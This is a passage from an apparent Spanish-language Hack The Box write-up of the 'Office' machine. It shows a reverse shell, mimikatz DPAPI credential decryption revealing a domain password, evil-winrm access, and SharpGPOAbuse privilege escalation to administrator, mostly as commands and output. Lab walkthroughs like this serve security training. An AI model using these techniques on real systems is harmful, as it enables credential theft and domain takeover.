+100 30567  100 30567    0     0  91336      0 --:--:-- --:--:-- --:--:-- 91792
+</code></pre></div></div>
+<ul>
+<li>Ahora después de esperar nos llega la shell.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ rlwrap nc -lvvp 4949
+listening on [any] 4949 ...
+connect to [10.10.14.74] from office.htb [10.10.11.3] 58419
+Microsoft Windows [Version 10.0.20348.2322]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice 5\program&gt;whoami
+whoami
+office\ppotts
+
+C:\Program Files\LibreOffice 5\program&gt;
+</code></pre></div></div>
+<h2 id="shell-as-hhogan">Shell as hhogan</h2>
+<ul>
+<li>Vemos que el usuario actual tiene las credenciales de hhogan almacenadas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Program Files\LibreOffice 5\program&gt;cmdkey /list
+cmdkey /list
+
+Currently stored credentials:
+
+    Target: LegacyGeneric:target=MyTarget
+    Type: Generic
+    User: MyUser
+
+    Target: Domain:interactive=office\hhogan
+    Type: Domain Password
+    User: office\hhogan
+</code></pre></div></div>
+<ul>
+<li>El usuario forma parte del grupo Remote Management Users así que podremos conectarnos con <code>evil-winrm</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Program Files\LibreOffice 5\program&gt;net user hhogan
+net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre></div></div>
+<ul>
+<li><p>Podemos usar <code>mimikatz.exe</code> para ver las credenciales pero el archivo donde estan guardadas las credenciales y el SID del usuario.</p>
+</li>
+<li><p>Comenzamos viendo el SID.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">C:\Program Files\LibreOffice 5\program&gt;whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name     SID
+============= =============================================
+office\ppotts S-1-5-21-1199398058-4196589450-691661856-1107
+</code></pre></div></div>
+<ul>
+<li>Vemos los archivos donde se almacenan credenciales cifradas.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Credentials
+gci -force AppData\Roaming\Microsoft\Credentials
+
+
+    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
+</code></pre></div></div>
+<ul>
+<li>Podemos ver los nombres.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect
+gci -force AppData\Roaming\Microsoft\Protect
+
+
+    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d---s-         1/17/2024   3:43 PM                S-1-5-21-1199398058-4196589450-691661856-1107
+-a-hs-          5/2/2023   4:13 PM             24 CREDHIST
+-a-hs-         1/17/2024   4:06 PM             76 SYNCHIST
+
+
+PS C:\Users\PPotts&gt; gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+gci -force AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+    Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-         1/17/2024   3:43 PM            740 10811601-0fa9-43c2-97e5-9bef8471fc7d
+-a-hs-          5/2/2023   4:13 PM            740 191d3f9d-7959-4b4d-a520-a444853c47eb
+-a-hs-         7/19/2024  12:44 AM            740 436aa19c-a54f-4fd5-b6db-c9faef682d27
+-a-hs-          5/2/2023   4:13 PM            900 BK-OFFICE
+-a-hs-         7/19/2024  12:44 AM             24 Preferred
+</code></pre></div></div>
+<ul>
+<li><p>Podemos usar RPC <a href="https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107">https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107</a>.</p>
+</li>
+<li><p>Tenemos la master key.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">PS C:\Users\PPotts\Downloads&gt; .\mimikatz.exe
+.\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  &quot;A La Vie, A L'Amour&quot; - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
+**MASTERKEYS**
+  dwVersion          : 00000002 - 2
+  szGuid             : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 00000000 - 0
+  dwMasterKeyLen     : 00000088 - 136
+  dwBackupKeyLen     : 00000068 - 104
+  dwCredHistLen      : 00000000 - 0
+  dwDomainKeyLen     : 00000174 - 372
+[masterkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : c521daa0857ee4fa6e4246266081e94c
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 1107e1ab3e107528a73a2dafc0a2db28de1ea0a07e92cff03a935635013435d75e41797f612903d6eea41a8fc4f7ebe8d2fbecb0c74cdebb1e7df3c692682a066faa3edf107792d116584625cc97f0094384a5be811e9d5ce84e5f032704330609171c973008d84f
+
+[backupkey]
+  **MASTERKEY**
+    dwVersion        : 00000002 - 2
+    salt             : a2741b13d7261697be4241ebbe05098a
+    rounds           : 00004650 - 18000
+    algHash          : 00008009 - 32777 (CALG_HMAC)
+    algCrypt         : 00006603 - 26115 (CALG_3DES)
+    pbKey            : 21bf24763fbb1400010c08fccc5423fe7da8190c61d3006f2d5efd5ea586f463116805692bae637b2ab548828b3afb9313edc715edd11dc21143f4ce91f4f67afe987005320d3209
+
+[domainkey]
+  **DOMAINKEY**
+    dwVersion        : 00000002 - 2
+    dwSecretLen      : 00000100 - 256
+    dwAccesscheckLen : 00000058 - 88
+    guidMasterKey    : {e523832a-e126-4d6e-ac04-ed10da72b32f}
+    pbSecret         : 159613bdc2d90dd4834a37e29873ce04c74722a706d0ba4770865039b3520ff46cf9c9281542665df2e72db48f67e16e2014e07b88f8b2f7d376a8b9d47041768d650c20661aee31dc340aead98b7600662d2dc320b4f89cf7384c2a47809c024adf0694048c38d6e1e3e10e8bd7baa7a6f1214cd3a029f8372225b2df9754c19e2ae4bc5ff4b85755b4c2dfc89add9f73c54ac45a221e5a72d3efe491aa6da8fb0104a983be20af3280ae68783e8648df413d082fa7d25506e9e6de1aadbf9cf93ec8dfc5fab4bfe1dd1492dbb679b1fa25c3f15fb8500c6021f518c74e42cd4b5d5d6e1057f912db5479ebda56892f346b4e9bf6404906c7cd65a54eea2842
+    pbAccesscheck    : 1430b9a3c4ab2e9d5f61dd6c62aab8e1742338623f08461fe991cccd5b3e4621d4c8e322650460181967c409c20efcf02e8936c007f7a506566d66ba57448aa8c3524f0b9cf881afcbb80c9d8c341026f3d45382f63f8665
+
+
+Auto SID from path seems to be: S-1-5-21-1199398058-4196589450-691661856-1107
+
+[domainkey] with RPC
+[DC] 'office.htb' will be the domain
+[DC] 'DC.office.htb' will be the DC server
+  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+</code></pre></div></div>
+<ul>
+<li>Si recordamos hay 3 creds encrypted.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">Directory: C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          5/9/2023   2:08 PM            358 18A1927A997A794B65E9849883AC3F3E
+-a-hs-          5/9/2023   4:03 PM            398 84F1CAEEBF466550F4967858F9353FB4
+-a-hs-         1/18/2024  11:53 AM            374 E76CCA3670CD9BB98DF79E0A8D176F1E
+</code></pre></div></div>
+<ul>
+<li>Después de probar aquí es donde se almacena la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">mimikatz # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {191d3f9d-7959-4b4d-a520-a444853c47eb}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 0000003a - 58
+  szDescription      : Enterprise Credential Data
+
+  algCrypt           : 00006603 - 26115 (CALG_3DES)
+  dwAlgCryptLen      : 000000c0 - 192
+  dwSaltLen          : 00000010 - 16
+  pbSalt             : 649c4466d5d647dd2c595f4e43fb7e1d
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 00008004 - 32772 (CALG_SHA1)
+  dwAlgHashLen       : 000000a0 - 160
+  dwHmac2KeyLen      : 00000010 - 16
+  pbHmack2Key        : 32e88dfd1927fdef0ede5abf2c024e3a
+  dwDataLen          : 000000c0 - 192
+  pbData             : f73b168ecbad599e5ca202cf9ff719ace31cc92423a28aff5838d7063de5cccd4ca86bfb2950391284b26a34b0eff2dbc9799bdd726df9fad9cb284bacd7f1ccbba0fe140ac16264896a810e80cac3b68f82c80347c4deaf682c2f4d3be1de025f0a68988fa9d633de943f7b809f35a141149ac748bb415990fb6ea95ef49bd561eb39358d1092aef3bbcc7d5f5f20bab8d3e395350c711d39dbe7c29d49a5328975aa6fd5267b39cf22ed1f9b933e2b8145d66a5a370dcf76de2acdf549fc97
+  dwSignLen          : 00000014 - 20
+  pbSign             : 21bfb22ca38e0a802e38065458cecef00b450976
+
+Decrypting Credential:
+ * volatile cache: GUID:{191d3f9d-7959-4b4d-a520-a444853c47eb};KeyHash:85285eb368befb1670633b05ce58ca4d75c73c77
+ * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+**CREDENTIAL**
+  credFlags      : 00000030 - 48
+  credSize       : 000000be - 190
+  credUnk0       : 00000000 - 0
+
+  Type           : 00000002 - 2 - domain_password
+  Flags          : 00000000 - 0
+  LastWritten    : 5/9/2023 11:03:21 PM
+  unkFlagsOrSize : 00000018 - 24
+  Persist        : 00000003 - 3 - enterprise
+  AttributeCount : 00000000 - 0
+  unk0           : 00000000 - 0
+  unk1           : 00000000 - 0
+  TargetName     : Domain:interactive=OFFICE\HHogan
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : OFFICE\HHogan
+  CredentialBlob : H4ppyFtW183#
+  Attributes     : 0
+
+mimikatz #
+</code></pre></div></div>
+<ul>
+<li>Tenemos credenciales <code>hhogan:H4ppyFtW183#</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cme smb office.htb -u 'hhogan' -p 'H4ppyFtW183#'
+SMB         office.htb      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
+SMB         office.htb      445    DC               [+] office.htb\hhogan:H4ppyFtW183#
+❯ cme winrm office.htb -u 'hhogan' -p 'H4ppyFtW183#'
+SMB         office.htb      5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb)
+HTTP        office.htb      5985   DC               [*] http://office.htb:5985/wsman
+WINRM       office.htb      5985   DC               [+] office.htb\hhogan:H4ppyFtW183# (Pwn3d!)
+</code></pre></div></div>
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+<ul>
+<li>Estamos en el grupo GPO Managers <a href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console">https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console</a>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre></div></div>
+<ul>
+<li>Podemos ver los GPOs.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; Get-GPO -All | Select-Object DisplayName
+
+DisplayName
+-----------
+Windows Firewall GPO
+Default Domain Policy
+Default Active Directory Settings GPO
+Default Domain Controllers Policy
+Windows Update GPO
+Windows Update Domain Policy
+Software Installation GPO
+Password Policy GPO
+</code></pre></div></div>
+<ul>
+<li><p>Como el usuario esta en ese grupo puedes editarlos los Group Policy Objects son políticas que Windows utiliza para gestionar computadoras en una red podemos usar esta herramienta <a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a>.</p>
+</li>
+<li><p>Vamos añadir al usuario actual al grupo de los administradores.</p>
+</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; .\SharpGPOAbuse.exe --AddLocalAdmin --GPOName &quot;Default Domain Policy&quot; --UserAccount &quot;OFFICE\hhogan&quot;
+[+] Domain = office.htb
+[+] Domain Controller = DC.office.htb
+[+] Distinguished Name = CN=Policies,CN=System,DC=office,DC=htb
+[+] SID Value of OFFICE\hhogan = S-1-5-21-1199398058-4196589450-691661856-1108
+[+] GUID of &quot;Default Domain Policy&quot; is: {31B2F340-016D-11D2-945F-00C04FB984F9}
+[+] File exists: \\office.htb\SysVol\office.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
+[+] The GPO does not specify any group memberships.
+[+] versionNumber attribute changed successfully
+[+] The version number in GPT.ini was increased successfully.
+[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
+[+] Done!
+
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+</code></pre></div></div>
+<ul>
+<li>Ahora comprobamos que estamos dentro.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</code></pre></div></div>
+<ul>
+<li>Si nos volvemos a conectar ya podemos ver la flag.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ evil-winrm -i office.htb -u 'hhogan' -p 'H4ppyFtW183#'
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
+a765138dbb01ba1b3773f22129fe1f3a
+*Evil-WinRM* PS C:\Users\HHogan\Documents&gt;
+</code></pre></div></div>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
